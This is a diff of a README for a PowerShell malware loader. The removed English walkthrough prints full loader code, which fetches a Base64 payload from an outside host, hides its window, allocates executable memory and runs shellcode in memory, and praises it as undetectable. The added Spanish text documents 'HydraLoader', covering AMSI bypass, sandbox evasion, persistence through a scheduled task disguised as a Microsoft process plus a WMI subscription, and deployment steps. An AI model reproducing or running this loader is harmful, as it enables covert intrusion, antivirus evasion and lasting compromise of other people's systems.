@@ -1,177 +1,67 @@
-# PowerShell-Loader
+# 🛡️ HydraLoader: Advanced PowerShell Execution Framework
 
-**🚀 Exploring PowerShell Memory Loader Techniques 🚀**
+**HydraLoader** es un framework de ejecución de payloads basado en PowerShell, altamente sofisticado y resiliente, diseñado para operaciones avanzadas de pentesting y red teaming. Emplea un enfoque de múltiples capas para la evasión, la persistencia y la ejecución en memoria, con el objetivo de operar sin ser detectado en entornos modernos y altamente monitorizados.
 
-▶️Let's get back the PowerShell script that showcases advanced memory loading techniques. This script downloads, decodes, and executes a payload in memory, all while staying stealthy. We will walk through each line of code, explaining how it works, step by step. 🌶
+---
 
-Environment Setup 👩‍💻
+## ✨ Características Principales
 
-The script begins by setting up the environment to ensure compatibility and persistence.
+HydraLoader está construido con un enfoque en el sigilo, la resiliencia y la adaptabilidad.
 
-$powershell_path = $env:windir + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
-$command_line_args = ((Get-WmiObject win32_process -Filter "ProcessId=$PID").CommandLine) -split '"'
-$script_argument = $command_line_args[$command_line_args.Length - 2]
-$is_64bit = ([IntPtr]::Size -eq 8)
-if (-not $is_64bit) { $powershell_path = "powershell.exe" }
-$is_valid_context = ($odontoclast -or $is_64bit)
-$user_profile = $env:userprofile
+### 🧠 Evasión y Anti-Análisis
+- **Bypass de AMSI en Memoria**: Parchea dinámicamente la Interfaz de Escaneo Antimalware (AMSI) en tiempo de ejecución para neutralizar la detección de amenazas basadas en scripts.
+- **Chequeos de Entorno Completos**: Detecta y evade activamente los entornos de análisis comprobando:
+    - **Depuradores**: Usa llamadas nativas a la API `IsDebuggerPresent()`.
+    - **Sandboxes**: Verifica la RAM del sistema, el número de núcleos de la CPU y el tiempo de actividad.
+    - **Herramientas de Análisis**: Busca procesos comunes de virtualización y análisis (ej. Wireshark, Process Monitor, herramientas de VMware/VirtualBox).
+- **Ofuscación Profunda**: Todo el script está fuertemente ofuscado, con cadenas críticas (funciones de API, DLLs) codificadas en Base64 y una estructura de código compactada para disuadir el análisis estático.
 
-🟠$env:windir + "\syswow64\WindowsPowerShell\v1.0\powershell.exe": Finds the PowerShell executable, defaulting to the 64-bit version. 📂
-🟠Get-WmiObject win32_process -Filter "ProcessId=$PID": Grabs the command-line arguments of the current process to extract $script_argument for persistence. 📹
-🟠[IntPtr]::Size -eq 8: Checks if the system is 64-bit, adjusting $powershell_path to powershell.exe for 32-bit systems. 🔍
-🟠$odontoclast -or $is_64bit: Uses a flag (likely set in a prior stage) to determine if execution should proceed. 🧩
-🟠$env:userprofile: Gets the user’s profile directory (e.g., C:\Users\Username) for later use. 🏠
+### 🐍 El Motor de Persistencia "Hidra"
+HydraLoader emplea un mecanismo de persistencia de doble cabeza y auto-reparación para asegurar el acceso a largo plazo y la resiliencia contra los intentos de eliminación.
+- **Método 1: Tarea Programada (Privilegios Elevados)**: Crea una tarea programada disfrazada de un proceso legítimo del sistema (`Microsoft Compatibility Appraiser`) que se ejecuta con privilegios de `SYSTEM` al iniciar sesión.
+- **Método 2: Suscripción a Eventos WMI (Sigilo Máximo)**: Establece una suscripción a un evento WMI permanente que se activa a intervalos. Este método es extremadamente difícil de detectar, ya que reside en el repositorio de WMI, fuera de las ubicaciones de auto-arranque habituales.
+- **Capacidad de Auto-reparación**: En cada ejecución, el framework comprueba si ambos mecanismos de persistencia están activos. Si uno ha sido descubierto y eliminado, el otro lo recrea automáticamente, asegurando que la "Hidra" sobreviva.
 
-Persistence via Process Spawning 🔄
+### 🚀 Ejecución del Payload
+- **Operación "Fileless" en Memoria**: El payload se descarga directamente en un búfer de memoria, se decodifica y se ejecuta sin tocar nunca el disco, minimizando la huella forense.
+- **Framework de Descifrado AES-256**: Incluye una función para descifrar payloads usando AES-256 (CBC). Esto permite que el payload se almacene y transmita en un estado cifrado, haciéndolo inútil para las herramientas de inspección de red. *(Nota: Requiere un payload pre-cifrado)*.
+- **Resolución Dinámica de APIs**: Resuelve todas las funciones de la API de Windows necesarias dinámicamente en tiempo de ejecución, evitando tablas de importación estáticas sospechosas.
 
-If conditions are met, the script launches a new PowerShell process to maintain execution.
-```
-if ($is_valid_context) {
-    $quoted_argument = '"' + $script_argument + '"'
-    while (-not $shell_application) {
-        $shell_type = [Type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
-        $shell_instance = [System.Activator]::CreateInstance($shell_type)
-        $shell_application = $shell_instance.Item()
-        if (-not $shell_application) { $placeholder = ''; $shell_application = $shell_instance.Item(0) }
-        if (-not $shell_application) { Start-Process "explorer.exe"; Start-Sleep 1 }
-    }
-    $shell_application.Document.Application.ShellExecute($powershell_path, $quoted_argument, $user_profile, $null, 0)
-    exit
-}
-```
-🟠if ($is_valid_context): Proceeds if the system is 64-bit or $odontoclast is true (likely from an earlier stage). 
-🟠$quoted_argument = '"' + $script_argument + '"': Quotes the extracted argument for safe passing. 
-🟠[Type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"): Gets the Shell.Application COM object using its CLSID.
-🟠while (-not $shell_application): Loops until the COM object is initialized, falling back to Item(0) or launching explorer.exe to ensure a shell environment. 
-🟠ShellExecute($powershell_path, $quoted_argument, $user_profile, $null, 0): Spawns a new PowerShell process with the argument in the users profile directory, hiding the window (0).
-🟠exit: Terminates the current script after spawning the new process.
+---
 
-Native API Access Functions ⚙️
+## ⚙️ Arquitectura y Flujo
 
-The script defines functions to interact with Windows APIs directly, enabling low-level operations.
-```
-function Get-FunctionPointer {
-    param ([string]$dll_name, [string]$function_name)
-    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
-    $kernel32_module = $kernel32_handle.GetMethod("GetModuleHandle").Invoke($null, @($dll_name))
-    $method = $kernel32_handle.GetMethod("GetProcAddress", [Type[]] @("System.Runtime.InteropServices.HandleRef", "string"))
-    return $method.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $kernel32_module)), $function_name))
-}
-function Create-Delegate {
-    param ([Parameter(Position = 0)] [Type[]]$parameter_types, [Parameter(Position = 1)] [Type]$return_type = [Void])
-    $assembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), "Run")
-    $module = $assembly.DefineDynamicModule("InMemoryModule", $false)
-    $delegate_type = $module.DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])
-    $method = $delegate_type.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $return_type, $parameter_types)
-    $method.SetImplementationFlags("Runtime, Managed")
-    return $delegate_type.CreateType()
-}
-```
-🟠Get-FunctionPointer: Loads a DLL (e.g., kernel32) and retrieves a function’s address using GetModuleHandle and GetProcAddress.
-🟠Create-Delegate: Dynamically creates a .NET delegate for a native function, specifying parameter and return types. This allows PowerShell to call APIs like VirtualAlloc.
-🟠These functions enable direct memory manipulation and execution, bypassing standard PowerShell cmdlets.
+El flujo de ejecución está diseñado para obtener el máximo sigilo y eficiencia:
 
-Payload Download and Decoding 📥
-The script fetches and prepares an external payload.
-```
-$download_path = 'Opsamlingscirkulrerne.Oxy'
-[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
-$web_client = New-Object System.Net.WebClient
-$web_client.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/14.0'
-$payload_url = "http://kerisel.fr/js/Ovenanfrt.mix"
-$web_client.DownloadFile($payload_url, $download_path)
-$downloaded_data = Get-Content $download_path
-$payload_bytes = [System.Convert]::FromBase64String($downloaded_data)
-```
-🟠$download_path = 'Opsamlingscirkulrerne.Oxy': Sets a temporary file name for the downloaded payload. 
-🟠[Net.ServicePointManager]::SecurityProtocol = 'Tls12': Ensures secure HTTPS connections.
-🟠New-Object System.Net.WebClient: Creates a web client for downloading.
-🟠$web_client.Headers['User-Agent'] = 'Mozilla/5.0...': Mimics a Firefox browser to avoid detection.
-🟠DownloadFile($payload_url, $download_path): Downloads the payload from the specified URL to the temp file.
-🟠Get-Content $download_path: Reads the file’s contents.
-🟠[System.Convert]::FromBase64String($downloaded_data): Decodes the Base64 content into a byte array ($payload_bytes).
+1.  **Inicialización**: El bypass de AMSI se ejecuta al instante.
+2.  **Chequeos de Evasión**: El script realiza todas las comprobaciones anti-análisis y anti-sandbox. Si alguna falla, termina silenciosamente.
+3.  **Chequeo y Reparación de Persistencia**: El motor Hidra verifica que tanto la Tarea Programada como la Suscripción WMI estén en su lugar. Si no, las crea.
+4.  **Entrega del Payload**: El framework descarga el payload desde la URL configurada directamente a la memoria.
+5.  **Descifrado y Preparación**: El payload se decodifica de Base64. Si AES está habilitado, se descifra.
+6.  **Ejecución**: El payload final se inyecta en la memoria y se ejecuta mediante llamadas sigilosas a la API de Windows.
 
-Stealth: Window Hiding 🕶
+---
 
-To avoid detection, the script hides its presence.
-```
-$zero = 0
-$window_title = 'dyreklasser'
-$Host.UI.RawUI.WindowTitle = $window_title
-$target_process = (Get-Process | Where-Object { $_.MainWindowTitle -eq $window_title })
-$window_handle = $target_process.MainWindowHandle
-$show_window_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Get-FunctionPointer "user32" "ShowWindow"),
-    (Create-Delegate @([IntPtr], [UInt32]) ([IntPtr]))
-)
-$show_window_delegate.Invoke($window_handle, $zero)
-```
-🟠$window_title = 'dyreklasser': Sets a benign console title. 
-🟠$Host.UI.RawUI.WindowTitle = $window_title: Applies the title to the current process. 
-🟠Get-Process | Where-Object { $_.MainWindowTitle -eq $window_title }: Finds the process with this title. 
-🟠Get-FunctionPointer "user32" "ShowWindow": Gets the ShowWindow API function pointer. 
-🟠Create-Delegate @([IntPtr], [UInt32]) ([IntPtr]): Creates a delegate for ShowWindow. 
-🟠$show_window_delegate.Invoke($window_handle, $zero): Hides the process window using SW_HIDE (0).
+## 🔧 Configuración y Despliegue
 
-Memory Allocation 💾
+### 1. Configuración del Payload
+- **URL**: Modifica la URL codificada en Base64 en el hashtable `$cfg` (`$cfg.o`).
+- **Formato del Payload**: El payload debe estar en formato de shellcode puro, que luego se codifica en Base64.
 
-The script allocates memory for the payload.
-```
-$virtual_alloc_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Get-FunctionPointer "kernel32" "VirtualAlloc"),
-    (Create-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
-)
-$protect_memory_delegate = Get-FunctionPointer "ntdll" "NtProtectVirtualMemory"
-$allocation_size1 = 12288
-$allocation_size2 = 4
-$protection_flag = 4
-$memory_region1 = $virtual_alloc_delegate.Invoke($zero, 6974, $allocation_size1, $protection_flag)
-$memory_region2 = $virtual_alloc_delegate.Invoke($zero, 45805568, $allocation_size1, $protection_flag)
-```
-🟠Get-FunctionPointer "kernel32" "VirtualAlloc": Gets the VirtualAlloc API pointer.
-🟠Create-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]): Creates a delegate for VirtualAlloc.
-🟠$protect_memory_delegate: Gets the NtProtectVirtualMemory pointer for memory protection.
-🟠$allocation_size1 = 12288, $allocation_size2 = 4, $protection_flag = 4: Sets sizes and PAGE_EXECUTE_READWRITE (0x04) permissions.
-🟠$virtual_alloc_delegate.Invoke($zero, 6974, $allocation_size1, $protection_flag): Allocates 6,974 bytes for the first region.
-🟠$virtual_alloc_delegate.Invoke($zero, 45805568, $allocation_size1, $protection_flag): Allocates a large 45MB region.
+### 2. Cifrado AES (Opcional)
+Para usar la capacidad de descifrado AES:
+1.  **Cifra tu payload**: Usa tu herramienta preferida para cifrar tu shellcode con AES-256 (modo CBC, padding PKCS7).
+2.  **Configura la Clave y el IV**:
+    - Codifica en Base64 tu clave de cifrado de 32 bytes y ponla en `$cfg.r`.
+    - Codifica en Base64 tu IV de 16 bytes y ponlo en `$cfg.s`.
+3.  **Codifica en Base64 el payload cifrado** y alójalo en tu URL.
+4.  **Activa el Descifrado**: Descomenta las tres líneas en la sección de manejo del payload del script para activar la rutina de descifrado.
 
-Payload Injection and Execution
+### 3. Despliegue
+El script es autónomo. Puede ser ejecutado a través de cualquier método de invocación de PowerShell estándar. En su primera ejecución en una máquina objetivo, establecerá automáticamente sus mecanismos de persistencia.
 
-💉💉💉💉💉💉💉💉
+---
 
-The script loads and runs the payload in memory.
-```
-[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, $zero, $memory_region1, 6974)
-[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, 6974, $memory_region2, (393989 - 6974))
-$call_window_proc_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Get-FunctionPointer "USER32" "CallWindowProcA"),
-    (Create-Delegate @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr]))
-)
-$call_window_proc_delegate.Invoke($memory_region1, $memory_region2, $protect_memory_delegate, $zero, $zero)
-```
+## ⚠️ Descargo de Responsabilidad
 
-🟠[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, $zero, $memory_region1, 6974): Copies the first 6,974 bytes to the small memory region.
-🟠[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, 6974, $memory_region2, (393989 - 6974)): Copies the remaining 387,015 bytes to the large region.
-🟠Get-FunctionPointer "USER32" "CallWindowProcA": Gets the CallWindowProcA API pointer.
-🟠Create-Delegate @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr]): Creates a delegate for CallWindowProcA. 
-🟠$call_window_proc_delegate.Invoke($memory_region1, $memory_region2, $protect_memory_delegate, $zero, $zero): Executes the first regions code (likely shellcode), passing the second region and memory protection function.
-
-Connection to Earlier Stages 🔗
-
-This script is part of a multi-stage process:
-
-➡️Stage 0: Likely decodes configuration or flags (e.g., $odontoclast) using functions like Uninstructedness to process strings (e.g., 'LLL{LL 9LL.BLLLALLL0LLL5 ...'). 🧬
-➡️Stage 1: Downloads and decodes the Base64 payload, producing $payload_bytes. 📥
-➡️Stage 2: Executes the payload in memory, as shown above. 🚀
-
-🔥🔥🔥 Why It is undetected and smart 🧠
-
-This script uses:
-
-▶️In-Memory Execution: Avoids disk writes to evade antivirus. 🕵️
-▶️Native API Calls: Bypasses PowerShell’s standard cmdlets for stealth. ⚙️
-▶️Base64 Decoding: Hides the payload in transit. 🔑
-▶️Window Hiding: Keeps the process invisible to users. 👻
-▶️Persistence: Spawns new processes to maintain execution. 🔄
-
-This is a masterclass in PowerShell scripting for advanced memory operations. 🤓
+Esta herramienta está destinada únicamente a operaciones autorizadas de red teaming, investigación de seguridad y fines educativos. El uso no autorizado de este framework contra cualquier sistema es ilegal. Los desarrolladores no asumen ninguna responsabilidad y no son responsables de ningún mal uso o daño causado por este programa.
